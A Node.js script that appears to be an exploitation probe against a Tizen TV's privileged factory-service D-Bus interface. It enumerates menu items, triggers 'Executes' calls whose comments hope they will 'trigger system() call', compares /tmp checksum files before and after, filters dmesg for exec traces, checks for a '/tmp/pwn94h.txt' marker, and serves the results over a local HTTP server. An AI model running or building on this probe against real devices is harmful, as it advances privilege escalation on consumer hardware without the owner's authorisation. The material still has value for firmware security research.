'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8183;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe94h.txt';
var PWN = '/tmp/pwn94h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. GetChildItem(2405, 0..2) - LOG(View Log) 3 children - KEY TARGET
  'r.log_view_children = [];',
  'for (var i = 0; i < 3; i++) {',
  '  try {',
  '    var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","2405",String(i)],{timeout:4000});',
  '    r.log_view_children.push({ idx: i, data: (o.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) { r.log_view_children.push({ idx: i, err: e.message.slice(0,40) }); }',
  '}',

  // 2. GetChildItem(2803, 0..4) - DB Download 5 children - KEY TARGET
  'r.db_download_children = [];',
  'for (var j = 0; j < 5; j++) {',
  '  try {',
  '    var o2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","2803",String(j)],{timeout:4000});',
  '    r.db_download_children.push({ idx: j, data: (o2.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 3. GetStrItem for interesting keys
  'var str_keys = [2405,2803,1503,103,240804,250804,90804,160804];',
  'r.str_items = {};',
  'str_keys.forEach(function(sk) {',
  '  try {',
  '    var o3 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetStrItem",String(sk)],{timeout:3000});',
  '    r.str_items["k"+sk] = (o3.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) {}',
  '});',

  // 4. GetLocalSetStr for interesting keys
  'var local_keys = [2405,2803,90804,240804,250804,160804];',
  'r.local_set_str = {};',
  'local_keys.forEach(function(lk) {',
  '  try {',
  '    var o4 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetLocalSetStr",String(lk)],{timeout:3000});',
  '    r.local_set_str["k"+lk] = (o4.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) {}',
  '});',

  // 5. Record /tmp checksum file timestamps BEFORE triggering anything
  'r.checksum_before = {};',
  'var cs_files = ["checksum_apps.dat","checksum_bin.dat","checksum_kernel.dat","checksum_lib.dat"];',
  'cs_files.forEach(function(f) {',
  '  try {',
  '    var st = fs.statSync("/tmp/"+f);',
  '    r.checksum_before[f] = { mtime: st.mtime, size: st.size };',
  '    r.checksum_before[f+"_content"] = fs.readFileSync("/tmp/"+f,"utf8").trim().slice(0,200);',
  '  } catch(e) {}',
  '});',

  // 6. Executes(30804, 0) - T-CON CheckSum - should trigger system() call
  'try {',
  '  var o_e1 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","30804","0"],{timeout:10000});',
  '  r.exec_tcon_checksum = (o_e1.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.exec_tcon_checksum_err = e.message.slice(0,60); }',

  // 7. Record checksum file timestamps AFTER
  'r.checksum_after = {};',
  'cs_files.forEach(function(f) {',
  '  try {',
  '    var st2 = fs.statSync("/tmp/"+f);',
  '    r.checksum_after[f] = { mtime: st2.mtime, size: st2.size };',
  '    r.checksum_after[f+"_content"] = fs.readFileSync("/tmp/"+f,"utf8").trim().slice(0,300);',
  '  } catch(e) {}',
  '});',

  // 8. Executes(60804, 0) - T-CON2 CheckSum
  'try {',
  '  var o_e2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","60804","0"],{timeout:10000});',
  '  r.exec_tcon2_checksum = (o_e2.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) {}',

  // 9. Executes(2405, 0) - Execute LOG(View Log)
  'try {',
  '  var o_e3 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","2405","0"],{timeout:10000});',
  '  r.exec_log_view = (o_e3.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.exec_log_view_err = e.message.slice(0,60); }',

  // 10. Executes(2803, 0) - Execute DB Download
  'try {',
  '  var o_e4 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","2803","0"],{timeout:10000});',
  '  r.exec_db_download = (o_e4.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.exec_db_download_err = e.message.slice(0,60); }',

  // 11. Check /tmp for new files after all executes
  'try {',
  '  var tmp2 = fs.readdirSync("/tmp");',
  '  r.tmp_after_all = tmp2.filter(function(f){ return f.indexOf("check")>-1||f.indexOf("log")>-1||f.indexOf("factory")>-1||f.indexOf("pwn")>-1||f.indexOf("dat")>-1; });',
  '} catch(e) {}',

  // 12. SaveLog(1) - try with mode 1
  'try {',
  '  var o_sl = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SaveLog","1"],{timeout:8000});',
  '  r.savelog1 = (o_sl.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) {}',

  // 13. GetChildItem(103, 0..5) - Spread Spectrum (19 children, first 6)
  'r.spread_spectrum_children = [];',
  'for (var ss = 0; ss < 6; ss++) {',
  '  try {',
  '    var o_ss = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","103",String(ss)],{timeout:3000});',
  '    r.spread_spectrum_children.push({ idx: ss, data: (o_ss.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 14. dmesg filtered for factory/exec/system calls
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_factory = dm.filter(function(l){',
  '    return l.indexOf("factory")>-1||l.indexOf("execl")>-1||l.indexOf("before")>-1||l.indexOf("checksum")>-1||l.indexOf("TCON")>-1||l.indexOf("tcon")>-1;',
  '  }).slice(-30).join("\\n").slice(0,2000);',
  '} catch(e) {}',

  // 15. pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
